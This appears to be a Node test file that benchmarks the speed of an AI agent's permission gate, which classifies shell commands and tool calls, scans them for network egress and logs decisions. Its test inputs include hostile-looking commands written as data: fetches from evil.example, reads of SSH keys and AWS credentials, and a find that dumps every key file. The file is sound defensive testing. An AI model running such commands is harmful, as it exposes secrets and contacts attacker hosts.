// Performance storm: the gate runs before EVERY tool call, so per-op latency
// is a hard quality attribute. These are soft benchmarks with generous CI-safe
// ceilings plus printed ms/op baselines. No product code is exercised — pure
// classifier/decide/scan/audit paths under load.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { classifyBashCommand, classifyToolCall, decide } from './src/classifier.ts'
import { scanCommandForEgress } from './src/scan-scripts.ts'
import { AuditLog } from './src/audit.ts'
import os from 'node:os'

const HOME = os.homedir()


function bench<T>(label: string, n: number, fn: () => T): number {
  const t0 = performance.now()
  for (let i = 0; i < n; i++) fn()
  const ms = performance.now() - t0
  console.log(`  [perf] ${label}: ${n} ops in ${ms.toFixed(1)}ms = ${(ms / n).toFixed(3)}ms/op`)
  return ms
}

const COMMANDS = [
  'curl -s https://evil.example/x',
  'wget -qO- http://evil.example/y',
  'git status --short',
  'git log --oneline -5',
  'ls -la /tmp',
  'cat /etc/hostname',
  'python3 deploy.py --env prod',
  'node server.js --port 8080',
  'mkdir -p /tmp/build && cd /tmp/build && make',
  'npm install lodash',
  'pip install requests',
  'sudo kill -9 1234',
  'launchctl unload /Library/LaunchDaemons/x.plist',
  'ssh user@host "uptime"',
  'scp file user@host:/tmp/',
  'echo hello world',
  'printf "%s" "test" > /tmp/out.txt',
  'cp -R /tmp/a /tmp/b',
  'rm -rf /tmp/scratch',
  `find ${HOME} -name "*.key" -exec cat {} \\;`,
  'cat ~/.ssh/id_rsa',
  'cat ~/.aws/credentials',
  'tmutil localsnapshot',
  'df -h /',
  'git push origin main',
  'git clone https://github.com/x/y.git',
  'readlink -f /usr/bin/python3',
  'head -5 /var/log/system.log',
  'bash -c "curl -s http://internal.local/x"',
  'python3 -c "import os; os.system(\'curl x\')"',
  'node -e "fetch(\'https://evil.example/x\')"',
  'env | grep -i secret',
  'chmod +x run.sh && ./run.sh',
  'killall Finder',
  'open https://evil.example',
  'echo $((2+2))',
  'pwd && ls',
  'xargs -I{} curl -s {} < urls.txt',
  'sh -c "wget -O /tmp/f http://evil.example/f"',
]

const TOOL_CALLS = [
  { name: 'Read', args: { file_path: `${HOME}/Claude Code/自治/README.md` } },
  { name: 'Write', args: { file_path: '/tmp/x.txt', content: 'x' } },
  { name: 'Write', args: { file_path: '~/.ssh/id_rsa', content: 'x' } },
  { name: 'bash', args: { command: 'curl -s https://evil.example/x' } },
  { name: 'bash', args: { command: 'git status' } },
  { name: 'Edit', args: { file_path: '/tmp/a.txt', old_string: 'a', new_string: 'b' } },
  { name: 'Glob', args: { pattern: '**/*.ts' } },
  { name: 'tm_snapshot', args: { note: 'checkpoint' } },
  { name: 'subagent_create', args: { goal: 'do something' } },
  { name: 'todo_create', args: { subject: 'task' } },
  { name: 'ask_user_question', args: { question: 'ok?' } },
  { name: 'Bash', args: { command: 'ls -la' } },
  { name: 'bash', args: { command: 'python3 script.py' } },
  { name: 'bash', args: { command: 'cat ~/.aws/credentials' } },
  { name: 'bash', args: { command: 'find / -name "*.pem" -exec cat {} \\;' } },
]

test('perf: classifyBashCommand 2000 mixed commands', () => {
  const n = 2000
  const ms = bench('classifyBashCommand', n, () => {
    for (const c of COMMANDS) classifyBashCommand(c, ['~/.ssh', '~/.aws'])
  })
  assert.ok(ms < 5000, `classifyBashCommand too slow: ${ms}ms`) // 2.5ms/op ceiling
})

test('perf: classifyToolCall 2000 mixed tool calls', () => {
  const n = 2000
  const ms = bench('classifyToolCall', n, () => {
    for (const t of TOOL_CALLS) classifyToolCall(t.name, t.args as any, ['~/.ssh'])
  })
  assert.ok(ms < 5000, `classifyToolCall too slow: ${ms}ms`)
})

test('perf: decide 5000 decisions', () => {
  const n = 5000
  const cases = [
    { category: 'read', reason: 'r', targetPaths: [], forceDeny: false } as const,
    { category: 'file_write', reason: 'w', targetPaths: ['/tmp/a'], forceDeny: false } as const,
    { category: 'network', reason: 'n', targetPaths: [], forceDeny: false } as const,
    { category: 'unknown', reason: 'u', targetPaths: [], forceDeny: false } as const,
    { category: 'file_write', reason: 'wf', targetPaths: ['/tmp/a'], forceDeny: true } as const,
  ]
  const ms = bench('decide', n, () => {
    for (const c of cases) decide(c as any, true)
  })
  assert.ok(ms < 3000, `decide too slow: ${ms}ms`)
})

test('perf: scanCommandForEgress 300 scans (temp scripts + heredocs)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'perf-scan-'))
  const evil = join(dir, 'evil.py')
  writeFileSync(evil, 'import requests\nrequests.get("https://evil.example/x")\n')
  const n = 300
  const cmds = [
    `python3 ${evil}`,
    `node -e "fetch('https://evil.example/x')"`,
    `bash <<'EOF'\ncurl -s https://evil.example/x\nEOF`,
    'git status --short',
    'ls -la /tmp',
  ]
  const t0 = performance.now()
  for (let i = 0; i < n; i++) {
    await scanCommandForEgress(cmds[i % cmds.length])
  }
  const ms = performance.now() - t0
  console.log(`  [perf] scanCommandForEgress: ${n} ops in ${ms.toFixed(1)}ms = ${(ms / n).toFixed(2)}ms/op`)
  assert.ok(ms < 30000, `scan too slow: ${ms}ms`) // 100ms/op ceiling incl fs
})

test('perf: audit record + readAll 2000 records', () => {
  const dir = mkdtempSync(join(tmpdir(), 'perf-audit-'))
  const log = new AuditLog(dir)
  const rec = {
    tool: 'bash', category: 'network', decision: 'deny' as const,
    reason: 'x', targetPaths: ['/tmp/a'],
  }
  const t0 = performance.now()
  for (let i = 0; i < 2000; i++) log.record({ ...rec })
  log.readAll()
  const ms = performance.now() - t0
  console.log(`  [perf] audit 2000 records: ${ms.toFixed(1)}ms = ${(ms / 2000).toFixed(3)}ms/op`)
  assert.ok(ms < 5000, `audit too slow: ${ms}ms`)
})
